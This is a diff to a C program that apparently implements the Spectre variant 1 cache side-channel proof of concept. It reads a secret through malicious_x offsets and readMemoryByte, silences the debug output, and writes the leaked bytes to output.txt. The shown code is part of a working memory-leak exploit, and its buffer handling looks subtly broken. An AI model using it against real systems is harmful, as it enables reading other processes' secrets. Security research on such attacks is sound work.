@@ -17,6 +17,11 @@
 #else
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
+void append(char* s, char c) {
+        int len = strlen(s);
+        s[len] = c;
+        s[len+1] = '\0';
+}
 
 /*
 VICTIM CODE
@@ -172,7 +177,7 @@ int main()
 {
 
     const char *secret = readimage();
-    printf("S=  %s", secret);
+    //printf("S=  %s", secret);
 
     size_t malicious_x = (size_t)(secret - (char *)arr1);
     int i, score[2], len = strlen(secret);
@@ -197,30 +202,21 @@ int main()
 
     printf("Reading %d bytes:\n", len);
     char str[strlen(secret) * sizeof(double)];
-    printf("%lu rf", sizeof(str) / sizeof(double)); // prints 10
+    printf("%lu", sizeof(str) / sizeof(double)); 
 
     while (--len >= 0)
     {
         // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         readMemoryByte(malicious_x++, value, score);
-        // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-        // printf("0x%02X=’%c’ score=%d ", value[0],
-        //        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-        // char ch = value[0] > 31 && value[0] < 127 ? value[0] : '?';
-        while (str[i] != '\0')
-        {
-            ++i;
-        }
-        str[i++] = value[0];
-        str[i] = '\0';
-
+        //strcat(str, value[0]);
+		append(str, value[0]);
         // if (score[1] > 0)
         // {
         //     printf("(second best: 0x%02X score=%d)", value[1], score[1]);
         //     printf("\n");
         // }
     }
-    printf("F=   %s", str);
+    //printf("%s", str);
     FILE *f = fopen("output.txt", "w");
     if (f == NULL)
     {
